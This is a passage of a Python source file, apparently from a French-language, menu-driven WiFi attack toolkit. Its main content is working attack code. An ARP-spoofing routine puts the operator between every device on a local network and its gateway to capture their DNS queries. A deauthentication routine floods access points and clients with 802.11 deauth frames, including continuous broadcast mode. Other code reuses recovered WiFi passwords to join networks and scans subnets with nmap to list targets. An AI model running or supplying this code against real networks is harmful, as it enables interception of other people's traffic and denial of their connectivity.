                    ['nmcli', '-t', '-f', 'DEVICE,TYPE', 'device', 'status'],
                    capture_output=True, text=True)
                iface_type = next(
                    (line.split(':')[1] for line in dev_r.stdout.strip().split('\n')
                     if line.split(':')[0] == iface),
                    None
                )
                console.print(f"[dim]NM voit {iface} comme: {iface_type!r}[/dim]")
                if iface_type == 'wifi':
                    break
                console.print(f"[info]⏳ Attente NM ({attempt+1}/3)...[/info]")
                subprocess.run(['sudo', 'nmcli', 'device', 'set', iface, 'managed', 'yes'],
                               capture_output=True)
                time.sleep(3)
            else:
                console.print(f"[error]NM ne reconnaît pas {iface} comme WiFi — abandon[/error]")
                return False

            # 5. Créer le profil et l'activer (évite 'device wifi connect' qui est fragile)
            con_name = f'cap-{ssid[:12]}'
            subprocess.run(['sudo', 'nmcli', 'connection', 'delete', con_name],
                           capture_output=True)
            console.print(f"[info]🔗 Création profil et connexion à {ssid}...[/info]")
            add_cmd = [
                'sudo', 'nmcli', 'connection', 'add',
                'type', 'wifi', 'ifname', iface,
                'con-name', con_name, 'ssid', ssid,
            ]
            if password:
                add_cmd += [
                    '802-11-wireless-security.key-mgmt', 'wpa-psk',
                    '802-11-wireless-security.psk', password,
                ]
            r_add = subprocess.run(add_cmd, capture_output=True, text=True)
            if r_add.returncode != 0:
                console.print(f"[error]Création profil échouée: {r_add.stderr.strip()[:100]}[/error]")
                return False

            r_up = subprocess.run(
                ['sudo', 'nmcli', 'connection', 'up', con_name, 'ifname', iface],
                capture_output=True, text=True, timeout=30)
            if r_up.returncode == 0:
                console.print(f"[success]✓ {iface} connectée à {ssid}[/success]")
                time.sleep(3)
                return True

            # 6. Dernier recours : nmcli device wifi connect
            console.print(f"[warning]Fallback nmcli device wifi connect...[/warning]")
            cmd = ['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid, 'ifname', iface]
            if password:
                cmd += ['password', password]
            r2 = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if r2.returncode == 0:
                console.print(f"[success]✓ {iface} connectée à {ssid}[/success]")
                time.sleep(3)
                return True
            console.print(f"[error]Échec: {r2.stderr.strip()[:150]}[/error]")
            return False

        except Exception as e:
            console.print(f"[error]Erreur connexion: {e}[/error]")
            return False

    def dns_monitoring_menu(self):
        """Menu monitoring DNS"""
        console.print("\n[title]═══ MONITORING DNS PASSIF ═══[/title]")
        console.print("\n[info]📡 Capture des requêtes DNS en clair (UDP port 53) sur le réseau local[/info]")
        console.print("[info]🎯 Tous les appareils du réseau utilisant DNS non chiffré seront visibles[/info]")
        console.print("[warning]⚠ Requiert des privilèges root (sudo)[/warning]")

        if not Confirm.ask("\n[orange1]Continuer ?[/orange1]", default=False):
            return

        # --- Étape 1 : sélection de l'interface de capture ---
        wifi_ifaces = self.dns_monitor.get_wifi_interfaces()
        if not wifi_ifaces:
            console.print("[error]Aucune interface WiFi trouvée[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        console.print("\n[orange1]Interfaces WiFi disponibles pour la capture:[/orange1]")
        for idx, iface in enumerate(wifi_ifaces, 1):
            ip_info = ""
            for net_iface in self.interfaces:
                if net_iface['name'] == iface and net_iface['ip'] != 'N/A':
                    ip_info = f" [green]({net_iface['ip']})[/green]"
                    break
            console.print(f"  {idx}. {iface}{ip_info}")

        iface_choice = Prompt.ask("Interface de capture", default="1")
        try:
            selected_iface = wifi_ifaces[int(iface_choice) - 1]
        except (ValueError, IndexError):
            selected_iface = wifi_ifaces[0]

        # --- Étape 2 : vérifier si l'interface a déjà une IP ---
        iface_has_ip = any(
            n['name'] == selected_iface and n['ip'] != 'N/A'
            for n in self.interfaces
        )

        if not iface_has_ip:
            console.print(f"\n[warning]⚠ {selected_iface} n'est pas connectée à un réseau (pas d'IP)[/warning]")

            # Chercher les réseaux actifs sur les autres interfaces
            active_networks = self._get_active_wifi_networks()
            # Exclure l'interface de capture elle-même
            active_networks = [n for n in active_networks if n['interface'] != selected_iface]

            if not active_networks:
                console.print("[error]Aucun réseau WiFi actif trouvé sur les autres interfaces[/error]")
                Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                return

            console.print("\n[orange1]Réseaux WiFi détectés sur les autres interfaces:[/orange1]")
            for idx, net in enumerate(active_networks, 1):
                pwd_status = "[green]mot de passe récupéré ✓[/green]" if net['password'] else "[warning]pas de mot de passe[/warning]"
                console.print(f"  {idx}. [white]{net['ssid']}[/white] (via {net['interface']}) — {pwd_status}")

            net_choice = Prompt.ask("\nRéseau à rejoindre", default="1")
            try:
                selected_net = active_networks[int(net_choice) - 1]
            except (ValueError, IndexError):
                selected_net = active_networks[0]

            # Demander le mot de passe si non récupéré
            if not selected_net['password']:
                selected_net['password'] = Prompt.ask(
                    f"[orange1]Mot de passe pour {selected_net['ssid']}[/orange1]",
                    password=True
                )

            # Connecter l'interface au réseau
            ok = self._connect_interface_to_network(
                selected_iface, selected_net['ssid'], selected_net['password']
            )
            if not ok:
                Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                return

            # Rafraîchir les interfaces pour obtenir la nouvelle IP
            self.interfaces = NetworkInterface.get_interfaces()
            new_ip = next(
                (n['ip'] for n in self.interfaces if n['name'] == selected_iface and n['ip'] != 'N/A'),
                None
            )
            if new_ip:
                console.print(f"[success]✓ {selected_iface} a obtenu l'IP {new_ip}[/success]")
            else:
                console.print(f"[warning]⚠ {selected_iface} n'a pas encore d'IP, la capture peut être vide[/warning]")

        # --- Étape 3 : ARP spoofing optionnel ---
        self.interfaces = NetworkInterface.get_interfaces()

        # Trouver TOUTES les interfaces connectées (avec IP) pour l'ARP spoof
        # En WiFi managed, l'interface qui a une route par défaut est la plus efficace
        connected_ifaces = [
            n for n in self.interfaces
            if n['ip'] != 'N/A' and n['name'] != 'lo'
        ]

        iface_ip = next(
            (n['ip'].split('/')[0] for n in self.interfaces if n['name'] == selected_iface and n['ip'] != 'N/A'),
            None
        )

        # Interface pour envoyer les paquets ARP spoof :
        # préférer celle qui a une route par défaut (meilleure connectivité L2)
        spoof_iface = selected_iface
        gateway_ip = None

        # Chercher la gateway sur toutes les interfaces connectées du même subnet
        for candidate in connected_ifaces:
            gw_result = subprocess.run(
                ['ip', 'route', 'show', 'dev', candidate['name']],
                capture_output=True, text=True
            )
            for line in gw_result.stdout.split('\n'):
                if 'default' in line:
                    parts = line.split()
                    if 'via' in parts:
                        gateway_ip = parts[parts.index('via') + 1]
                        spoof_iface = candidate['name']
                        break
            if gateway_ip:
                break

        if not gateway_ip and iface_ip:
            gateway_ip = '.'.join(iface_ip.split('.')[:3]) + '.1'

        # Si l'interface de spoof est différente de celle de capture, le dire
        if spoof_iface != selected_iface:
            console.print(
                f"\n[info]ℹ Interface de capture : [orange1]{selected_iface}[/orange1] "
                f"— Interface ARP spoof : [orange1]{spoof_iface}[/orange1][/info]"
            )
            console.print(
                f"[dim](En WiFi managed, {spoof_iface} a la route par défaut "
                f"→ meilleure portée L2)[/dim]"
            )

        use_arp = False
        if gateway_ip:
            console.print(f"\n[info]Gateway détectée: [orange1]{gateway_ip}[/orange1][/info]")
            console.print("[info]🎯 L'ARP spoofing permet de capturer le DNS des autres appareils[/info]")
            console.print("[warning]⚠ Tous les appareils du réseau seront redirigés via ta machine[/warning]")
            use_arp = Confirm.ask("[orange1]Activer l'ARP spoofing ?[/orange1]", default=False)

        # --- Étape 4 : durée et lancement ---
        duration = Prompt.ask("\n[orange1]Durée du monitoring (secondes)[/orange1]", default="120")

        arp_thread = None
        arp_stop = threading.Event()

        if use_arp and gateway_ip and iface_ip:
            # Activer l'IP forwarding
            subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)
            # Scanner les hôtes du réseau
            subnet = '.'.join(iface_ip.split('.')[:3]) + '.0/24'
            console.print(f"[info]🔍 Scan des hôtes sur {subnet}...[/info]")
            nm_result = subprocess.run(
                ['sudo', 'nmap', '-sn', '-T4', subnet],
                capture_output=True, text=True, timeout=30
            )
            targets = []
            for line in nm_result.stdout.split('\n'):
                m = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                if m:
                    ip = m.group(1)
                    if ip != iface_ip and ip != gateway_ip:
                        targets.append(ip)
            console.print(f"[success]✓ {len(targets)} cible(s) trouvée(s)[/success]")
            if targets:
                # Résoudre les MACs via le cache ARP système (/proc/net/arp)
                # puis compléter avec arping pour les IPs manquantes
                from scapy.all import ARP, Ether, sendp, get_if_hwaddr
                console.print(f"[info]🔎 Résolution MAC des cibles...[/info]")
                mac_table = {}  # ip -> mac

                # 1. Lire le cache ARP du kernel — rapide, pas besoin de route
                try:
                    with open('/proc/net/arp', 'r') as f:
                        for line in f.readlines()[1:]:  # skip header
                            parts = line.split()
                            if len(parts) >= 4 and parts[2] == '0x2':  # 0x2 = entrée complète
                                ip_entry = parts[0]
                                mac_entry = parts[3]
                                if mac_entry != '00:00:00:00:00:00':
                                    mac_table[ip_entry] = mac_entry
                except Exception:
                    pass

                # 2. Pour les IPs manquantes, utiliser arping (bas niveau, pas de route)
                all_ips = [gateway_ip] + targets
                missing = [ip for ip in all_ips if ip not in mac_table]
                if missing:
                    console.print(f"[info]arping sur {len(missing)} IP(s) manquante(s)...[/info]")
                    for target_ip in missing:
                        try:
                            r = subprocess.run(
                                ['sudo', 'arping', '-c', '1', '-I', spoof_iface, target_ip],
                                capture_output=True, text=True, timeout=2
                            )
                            m = re.search(r'\[([0-9a-f:]{17})\]', r.stdout, re.IGNORECASE)
                            if m:
                                mac_table[target_ip] = m.group(1).lower()
                        except Exception:
                            pass

                console.print(f"[success]✓ {len(mac_table)} MAC(s) résolue(s)[/success]")

                # Filtrer uniquement les cibles dont on a la MAC
                targets_with_mac = [(ip, mac_table[ip]) for ip in targets if ip in mac_table]
                gateway_mac = mac_table.get(gateway_ip)
                if not gateway_mac:
                    console.print(f"[warning]⚠ MAC de la gateway inconnue, ARP spoof peut être incomplet[/warning]")

                def arp_spoof_loop(targets_macs, gateway, gateway_mac, iface, stop_event):
                    try:
                        from scapy.all import ARP, Ether, sendp, get_if_hwaddr
                        our_mac = get_if_hwaddr(iface)
                        console.print(f"[warning]🎭 ARP spoofing actif sur {len(targets_macs)} cibles...[/warning]")
                        while not stop_event.is_set():
                            for target_ip, target_mac in targets_macs:
                                # Dire à la cible : "je suis la gateway"
                                pkt = Ether(dst=target_mac) / ARP(
                                    op=2,
                                    pdst=target_ip, hwdst=target_mac,
                                    psrc=gateway, hwsrc=our_mac
                                )
                                sendp(pkt, iface=iface, verbose=False)
                                # Dire à la gateway : "je suis la cible"
                                if gateway_mac:
                                    pkt2 = Ether(dst=gateway_mac) / ARP(
                                        op=2,
                                        pdst=gateway, hwdst=gateway_mac,
                                        psrc=target_ip, hwsrc=our_mac
                                    )
                                    sendp(pkt2, iface=iface, verbose=False)
                            stop_event.wait(2)
                    except Exception as e:
                        console.print(f"[error]Erreur ARP spoof: {e}[/error]")

                arp_thread = threading.Thread(
                    target=arp_spoof_loop,
                    args=(targets_with_mac, gateway_ip, gateway_mac, spoof_iface, arp_stop),
                    daemon=True
                )
                arp_thread.start()

        # Si l'interface de capture n'a pas de route, on peut aussi écouter sur spoof_iface
        # qui reçoit effectivement le trafic redirigé
        capture_iface = spoof_iface if (use_arp and spoof_iface != selected_iface) else selected_iface
        if capture_iface != selected_iface:
            console.print(
                f"[info]📡 Capture sur [orange1]{capture_iface}[/orange1] "
                f"(c'est là qu'arrive le trafic redirigé)[/info]"
            )

        try:
            duration_int = int(duration)
            self.dns_monitor.start_monitoring(capture_iface, duration_int, all_networks=True)
        except ValueError:
            console.print("[error]Durée invalide[/error]")
        except KeyboardInterrupt:
            console.print("\n[warning]Monitoring interrompu[/warning]")
            if self.dns_monitor.dns_queries:
                self.dns_monitor.display_summary({})
        finally:
            # Arrêter l'ARP spoofing et restaurer les tables ARP
            if use_arp and gateway_ip:
                arp_stop.set()
                console.print("[info]🔧 Restauration des tables ARP...[/info]")
                try:
                    from scapy.all import ARP, Ether, sendp, get_if_hwaddr
                    import time as _time
                    our_mac = get_if_hwaddr(spoof_iface)
                    for _ in range(3):
                        for target_ip, target_mac in targets_with_mac:
                            # Restaurer : dire à la cible la vraie MAC de la gateway
                            sendp(Ether(dst=target_mac) / ARP(
                                op=2, pdst=target_ip, hwdst=target_mac,
                                psrc=gateway_ip,
                                hwsrc=gateway_mac if gateway_mac else our_mac
                            ), iface=spoof_iface, verbose=False)
                        _time.sleep(0.3)
                except Exception:
                    pass
                subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True)
                console.print("[success]✓ ARP restauré[/success]")

        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
    
    def deauth_menu(self):
        """Deauth WiFi — mode monitor (hors réseau) ou mode connecté (nmap clients)"""
        console.print("\n[title]═══ DEAUTH WIFI ═══[/title]")
        console.print("\n[info]💀 Envoie des trames 802.11 deauth[/info]")

        if not Confirm.ask("\n[orange1]Continuer ?[/orange1]", default=False):
            return

        wifi_ifaces = self.dns_monitor.get_wifi_interfaces()
        if not wifi_ifaces:
            console.print("[error]Aucune interface WiFi trouvée[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        console.print("\n[orange1]Interfaces WiFi:[/orange1]")
        for idx, iface in enumerate(wifi_ifaces, 1):
            ip_info = next((f" [green]({n['ip']})[/green]" for n in self.interfaces
                            if n['name'] == iface and n['ip'] != 'N/A'), "")
            console.print(f"  {idx}. {iface}{ip_info}")

        try:
            selected_iface = wifi_ifaces[int(Prompt.ask("Interface", default="1")) - 1]
        except (ValueError, IndexError):
            selected_iface = wifi_ifaces[0]

        iface_has_ip = any(n['name'] == selected_iface and n['ip'] != 'N/A'
                           for n in self.interfaces)

        console.print("\n[orange1]Mode:[/orange1]")
        console.print("  [bold cyan]1.[/bold cyan] Monitor  — scan externe, aucune connexion nécessaire")
        conn_str = "[green]✓ connecté[/green]" if iface_has_ip else "[dim]rejoindre réseau[/dim]"
        console.print(f"  [bold cyan]2.[/bold cyan] Connecté — nmap liste les clients  {conn_str}")
        try:
            mode = int(Prompt.ask("[orange1]Mode[/orange1]", default="1"))
        except ValueError:
            mode = 1

        if mode == 2:
            self._deauth_connected(selected_iface, iface_has_ip)
        else:
            self._deauth_monitor(selected_iface)

    def _set_channel(self, mon_iface: str, channel):
        """Fixe le canal — gère 2.4GHz et 5GHz (HT20 requis pour les canaux > 14)"""
        try:
            ch = int(str(channel).strip())
        except (ValueError, TypeError):
            console.print(f"[warning]Canal invalide: {channel!r}[/warning]")
            return
        band = "(5GHz)" if ch > 14 else "(2.4GHz)"
        console.print(f"[info]📻 Canal {ch} {band}...[/info]")
        for flags in [["HT20"], ["HT40+"], []]:
            args = ["sudo", "iw", "dev", mon_iface, "set", "channel", str(ch)] + flags
            if subprocess.run(args, capture_output=True).returncode == 0:
                time.sleep(0.5)
                return
        subprocess.run(["sudo", "iwconfig", mon_iface, "channel", str(ch)], capture_output=True)
        time.sleep(0.5)

    def _get_monitor_iface(self, selected_iface: str) -> str:
        """Active le mode monitor et retourne le nom de l'interface créée"""
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
        before = set(subprocess.run(["ip", "-o", "link", "show"],
                     capture_output=True, text=True).stdout.split("\n"))
        r = subprocess.run(["sudo", "airmon-ng", "start", selected_iface],
                           capture_output=True, text=True)
        time.sleep(1)
        after = set(subprocess.run(["ip", "-o", "link", "show"],
                    capture_output=True, text=True).stdout.split("\n"))
        mon = None
        for line in after - before:
            m = re.search(r"\d+:\s+(\w+):", line)
            if m and ("mon" in m.group(1).lower() or m.group(1) != selected_iface):
                mon = m.group(1); break
        if not mon:
            iw = subprocess.run(["sudo", "iw", "dev"], capture_output=True, text=True).stdout
            cur = None
            for line in iw.split("\n"):
                mm = re.search(r"Interface (\w+)", line)
                if mm: cur = mm.group(1)
                if "monitor" in line.lower() and cur:
                    mon = cur; break
        if not mon:
            for c in [selected_iface + "mon", "mon0", "mon1"]:
                if subprocess.run(["ip", "link", "show", c], capture_output=True).returncode == 0:
                    mon = c; break
        mon_iface = mon or (selected_iface + "mon")
        
        # Enregistrer pour nettoyage automatique
        cleanup_manager.register_monitor_interface(mon_iface)
        
        return mon_iface

    def _deauth_monitor(self, selected_iface: str):
        """Deauth mode monitor — scan iw/airodump puis envoi trames"""
        import tempfile, os, shutil
        console.print(f"[warning]⚠ {selected_iface} passera en mode monitor[/warning]")
        mon_iface = self._get_monitor_iface(selected_iface)
        console.print(f"[success]✓ Monitor: [bold]{mon_iface}[/bold][/success]")

        tmpdir = tempfile.mkdtemp(prefix="deauth_")
        os.chmod(tmpdir, 0o777)
        aps = {}

        try:
            scan_dur = int(Prompt.ask("[orange1]Durée scan (s)[/orange1]", default="15"))
            console.print(f"[info]🔍 Scan 2.4GHz + 5GHz ({scan_dur}s)...[/info]")
            devnull = open(os.devnull, "w")
            p = subprocess.Popen(
                ["sudo", "airodump-ng", "--band", "abg", "--output-format", "csv",
                 "-w", f"{tmpdir}/scan", mon_iface],
                stdout=devnull, stderr=devnull,
                stdin=subprocess.DEVNULL, close_fds=True)
            cleanup_manager.register_process(p)  # Enregistrer pour cleanup
            time.sleep(scan_dur)
            subprocess.run(["sudo", "pkill", "-9", "-f", "airodump-ng"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try: p.wait(timeout=3)
            except Exception: pass
            devnull.close()

            csv_f = next((os.path.join(tmpdir, f) for f in sorted(os.listdir(tmpdir))
                          if f.endswith(".csv")), None)
            if csv_f:
                in_sta = False
                for line in open(csv_f, errors="ignore"):
                    if "Station MAC" in line: in_sta = True; continue
                    if not line.strip(): continue
                    p2 = [x.strip() for x in line.split(",")]
                    if not in_sta and len(p2) >= 14 and len(p2[0]) == 17 and "BSSID" not in p2[0]:
                        b = p2[0].lower()
                        aps[b] = {"ssid": p2[13] or "<hidden>", "channel": p2[3].strip(),
                                  "enc": p2[5].strip() or "OPN", "clients": []}
                    elif in_sta and len(p2) >= 6 and len(p2[0]) == 17:
                        cm = p2[0].lower(); ab = p2[5].lower().strip()
                        if ab and ab != "(not associated)" and ab in aps:
                            aps[ab]["clients"].append(cm)
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)
            import os as _os; _os.system("reset"); time.sleep(0.3)

        # Fallback iw scan
        if not aps:
            console.print("[warning]⚠ Fallback iw scan...[/warning]")
            subprocess.run(["sudo", "ip", "link", "set", mon_iface, "down"], capture_output=True)
            subprocess.run(["sudo", "iw", mon_iface, "set", "type", "managed"], capture_output=True)
            subprocess.run(["sudo", "ip", "link", "set", mon_iface, "up"], capture_output=True)
            iw_out = subprocess.run(["sudo", "iw", "dev", mon_iface, "scan"],
                                    capture_output=True, text=True, timeout=20).stdout
            subprocess.run(["sudo", "ip", "link", "set", mon_iface, "down"], capture_output=True)
            subprocess.run(["sudo", "iw", mon_iface, "set", "type", "monitor"], capture_output=True)
            subprocess.run(["sudo", "ip", "link", "set", mon_iface, "up"], capture_output=True)
            cur_b = cur_s = cur_c = None; cur_e = "WPA2"
            def _sv():
                if cur_b and len(cur_b) == 17 and cur_b.count(":") == 5:
                    aps[cur_b] = {"ssid": cur_s or "<hidden>", "channel": str(cur_c or ""),
                                  "enc": cur_e, "clients": []}
            for line in iw_out.split("\n"):
                line = line.strip()
                if line.startswith("BSS "):
                    _sv(); cur_b = line.split()[1][:17]; cur_s = cur_c = None; cur_e = "WPA2"
                elif line.startswith("SSID:") and "Extended" not in line:
                    v = line[5:].strip()
                    if v: cur_s = v
                elif "DS Parameter set: channel" in line or "* primary channel:" in line:
                    mm = re.search(r"channel[:\s]+(\d+)", line, re.I)
                    if mm: cur_c = mm.group(1)
                elif "WPA3" in line: cur_e = "WPA3"
                elif "WPA2" in line or "RSN" in line: cur_e = "WPA2"
            _sv()
            if aps: console.print(f"[success]✓ {len(aps)} AP(s)[/success]")

        if not aps:
            console.print("[error]Aucun AP trouvé[/error]")
            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface], capture_output=True)
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True)
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        ap_list = [(b, i) for b, i in aps.items() if len(b) == 17 and b.count(":") == 5]
        ap_t = Table(title="📡 APs", box=box.DOUBLE_EDGE, style="white", header_style="bold red")
        ap_t.add_column("#",     style="orange1",    width=4, justify="right")
        ap_t.add_column("SSID",  style="bold green", width=26, overflow="fold")
        ap_t.add_column("BSSID", style="dim white",  width=19)
        ap_t.add_column("CH",    style="cyan",       width=5,  justify="center")
        ap_t.add_column("Enc",   style="yellow",     width=10)
        for idx, (b, i) in enumerate(ap_list, 1):
            ch = str(i["channel"])
            ch_c = f"[magenta]{ch}[/magenta]" if ch.isdigit() and int(ch) > 14 else ch
            ap_t.add_row(str(idx), i["ssid"], b, ch_c, i["enc"])
        console.print(ap_t)

        try:
            tb, ti = ap_list[int(Prompt.ask("[orange1]AP cible[/orange1]", default="1")) - 1]
        except (ValueError, IndexError):
            tb, ti = ap_list[0]

        self._send_deauth(mon_iface, tb, ti["ssid"], ti["channel"], ti["clients"])
        subprocess.run(["sudo", "airmon-ng", "stop", mon_iface], capture_output=True)
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True)
        console.print(f"[success]✓ {mon_iface} → managed[/success]")
        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")

    def _deauth_connected(self, selected_iface: str, already_connected: bool):
        """Deauth depuis réseau connecté — nmap pour lister les clients"""
        if not already_connected:
            active = [n for n in self._get_active_wifi_networks()
                      if n["interface"] != selected_iface]
            if not active:
                console.print("[error]Aucun réseau actif trouvé[/error]")
                Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                return
            console.print("\n[orange1]Réseaux disponibles:[/orange1]")
            for idx, net in enumerate(active, 1):
                pwd_ok = "[green]✓[/green]" if net["password"] else "[warning]pas de mdp[/warning]"
                console.print(f"  {idx}. [white]{net['ssid']}[/white] ({net['interface']}) — {pwd_ok}")
            try:
                sel = active[int(Prompt.ask("Réseau", default="1")) - 1]
            except (ValueError, IndexError):
                sel = active[0]
            if not sel["password"]:
                sel["password"] = Prompt.ask(f"[orange1]Mot de passe {sel['ssid']}[/orange1]",
                                             password=True)
            if not self._connect_interface_to_network(selected_iface, sel["ssid"], sel["password"]):
                Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                return
            self.interfaces = NetworkInterface.get_interfaces()

        # BSSID+canal via iw link
        iw_r = subprocess.run(["sudo", "iw", "dev", selected_iface, "link"],
                              capture_output=True, text=True)
        cur_bssid = cur_ssid = cur_ch = None
        for line in iw_r.stdout.split("\n"):
            line = line.strip()
            if line.startswith("Connected to"): cur_bssid = line.split()[2].lower()
            elif line.startswith("SSID:"): cur_ssid = line[5:].strip()
            elif "channel" in line.lower():
                m = re.search(r"channel (\d+)", line, re.I)
                if m: cur_ch = int(m.group(1))
        if not cur_ch:
            iw2 = subprocess.run(["sudo", "iw", "dev", selected_iface, "info"],
                                  capture_output=True, text=True)
            for line in iw2.stdout.split("\n"):
                m = re.search(r"channel (\d+)", line, re.I)
                if m: cur_ch = int(m.group(1)); break

        if not cur_bssid:
            console.print("[error]Pas connecté à un AP[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        band = "(5GHz)" if cur_ch and cur_ch > 14 else "(2.4GHz)"
        console.print(f"[success]✓ AP: [white]{cur_ssid}[/white] ({cur_bssid}) ch{cur_ch} {band}[/success]")

        # Nmap clients
        clients = []
        iface_ip = next((n["ip"].split("/")[0] for n in self.interfaces
                         if n["name"] == selected_iface and n["ip"] != "N/A"), None)
        if iface_ip:
            subnet = ".".join(iface_ip.split(".")[:3]) + ".0/24"
            console.print(f"[info]🔍 Scan {subnet}...[/info]")
            nm = subprocess.run(["sudo", "nmap", "-sn", "-T4", "--min-parallelism", "10", subnet],
                                capture_output=True, text=True, timeout=20)
            cur_ip = None
            for line in nm.stdout.split("\n"):
                m_ip = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                if m_ip: cur_ip = m_ip.group(1)
                m_mac = re.search(r"MAC Address: ([0-9A-F:]{17})", line, re.IGNORECASE)
                if m_mac and cur_ip:
                    mac = m_mac.group(1).lower()
                    if mac != cur_bssid:
                        clients.append({"mac": mac, "ip": cur_ip,
                                        "mfr": OUILookup.lookup(mac) or "Inconnu"})
            console.print(f"[success]✓ {len(clients)} client(s)[/success]")

        console.print(f"\n[orange1]Clients sur [white]{cur_ssid}[/white]:[/orange1]")
        console.print("  [bold red]0.[/bold red] Broadcast — tous")
        for idx, c in enumerate(clients, 1):
            console.print(f"  [orange1]{idx}.[/orange1] [white]{c['mac']}[/white]  {c['ip']}  [dim]{c['mfr'][:28]}[/dim]")
        if not clients:
            console.print("  [dim]Aucun client détecté[/dim]")

        try:
            cidx = int(Prompt.ask("\n[orange1]Cible[/orange1]", default="0"))
            tgt_mac = "ff:ff:ff:ff:ff:ff" if cidx == 0 else clients[cidx - 1]["mac"]
        except (ValueError, IndexError):
            tgt_mac = "ff:ff:ff:ff:ff:ff"

        # Passer en monitor
        console.print("\n[info]🔧 Mode monitor...[/info]")
        mon_iface = self.dns_monitor.enable_monitor_mode(selected_iface)
        if not mon_iface:
            console.print("[error]Impossible d\'activer le mode monitor[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        self._send_deauth(mon_iface, cur_bssid, cur_ssid or "?",
                          str(cur_ch or ""), [], forced_client=tgt_mac)
        self.dns_monitor.disable_monitor_mode(selected_iface)
        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")

    def _send_deauth(self, mon_iface: str, bssid: str, ssid: str,
                     channel: str, clients: list, forced_client: str = None):
        """Envoie les trames deauth"""
        target_client = forced_client or "ff:ff:ff:ff:ff:ff"
        if clients and not forced_client:
            console.print(f"\n[orange1]Clients pour {ssid}:[/orange1]")
            console.print("  [bold red]0.[/bold red] Broadcast")
            for idx, cm in enumerate(clients, 1):
                console.print(f"  [orange1]{idx}.[/orange1] [white]{cm}[/white]  [dim]{OUILookup.lookup(cm) or 'Inconnu'}[/dim]")
            try:
                cidx = int(Prompt.ask("[orange1]Cible[/orange1]", default="0"))
                if cidx > 0: target_client = clients[cidx - 1]
            except (ValueError, IndexError): pass

        try:
            nb = int(Prompt.ask("[orange1]Trames (0=continu)[/orange1]", default="0"))
            continuous = nb == 0
        except ValueError:
            nb = 100; continuous = False

        self._set_channel(mon_iface, channel)

        console.print(f"\n[error]💀 Deauth → [white]{ssid}[/white] ({bssid}) / {target_client}[/error]")
        if continuous:
            console.print("[warning]Mode continu — Ctrl+C pour arrêter[/warning]")

        sent = 0
        stop_ev = threading.Event()
        import termios, sys as _sys
        try: old_tty = termios.tcgetattr(_sys.stdin)
        except Exception: old_tty = None

        try:
            from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
            f1 = (RadioTap() /
                  Dot11(addr1=target_client, addr2=bssid, addr3=bssid, type=0, subtype=12) /
                  Dot11Deauth(reason=7))
            f2 = (RadioTap() /
                  Dot11(addr1=bssid, addr2=target_client, addr3=bssid, type=0, subtype=12) /
                  Dot11Deauth(reason=7))

            if continuous:
                console.print("[dim]Envoi — Ctrl+C pour arrêter[/dim]\n")
                sent_ref = [0]
                stop_ev.clear()

                def _loop():
                    while not stop_ev.is_set():
                        sendp(f1, iface=mon_iface, verbose=False, count=10, inter=0.003)
                        sendp(f2, iface=mon_iface, verbose=False, count=10, inter=0.003)
                        sent_ref[0] += 20

                t = threading.Thread(target=_loop, daemon=True)
                t.start()
                try:
                    while t.is_alive():
                        console.print(f"[orange1]Trames: {sent_ref[0]}[/orange1]", end="\r")
                        time.sleep(0.2)
                except KeyboardInterrupt:
                    pass
                finally:
                    stop_ev.set()
                    t.join(timeout=3)
                sent = sent_ref[0]
                console.print(f"\n[success]✓ Arrêté — {sent} trames[/success]")
            else:
                h = max(nb // 2, 1)
                sendp(f1, iface=mon_iface, verbose=False, count=h, inter=0.003)
                sendp(f2, iface=mon_iface, verbose=False, count=h, inter=0.003)
                console.print(f"[success]✓ {h * 2} trames[/success]")

        except KeyboardInterrupt:
            stop_ev.set()
            console.print(f"\n[warning]Arrêté — {sent} trames[/warning]")
        except Exception as e:
            console.print(f"[error]Erreur scapy: {e}[/error]")
            import traceback; console.print(f"[dim]{traceback.format_exc()[:400]}[/dim]")
        finally:
            stop_ev.set()
            if old_tty:
                try:
                    termios.tcsetattr(_sys.stdin, termios.TCSADRAIN, old_tty)
                    termios.tcflush(_sys.stdin, termios.TCIFLUSH)
                except Exception: pass

    def nmap_menu(self):
        """Menu Nmap avec boucle de scan améliorée"""
        console.print("\n[title]═══ SCANNER NMAP ═══[/title]")
        
        # NOUVELLE FONCTIONNALITÉ : Choisir le timing AVANT le scan
        timing = Prompt.ask(
            "\n[orange1]Timing du scan réseau[/orange1]",
            choices=["T1", "T2", "T3", "T4", "T5"],
            default="T3"
        )
        
        # Sélection de l'interface
        console.print("\n[orange1]Interfaces disponibles:[/orange1]")
        for idx, iface in enumerate(self.interfaces, 1):
            console.print(f"  {idx}. {iface['name']} ({iface['ip']})")
        console.print("  0. Scan d'une IP/réseau/domaine spécifique")
        
        iface_choice = Prompt.ask("Choisissez une option", default="1")
        
        try:
            # Option 0: scan d'IP/domaine spécifique
            if iface_choice == "0":
                network = Prompt.ask("\n[orange1]Entrez l'IP, le réseau ou le domaine[/orange1]\n"
                                     "[dim](ex: 192.168.1.0/24, 192.168.1.1, example.com)[/dim]")
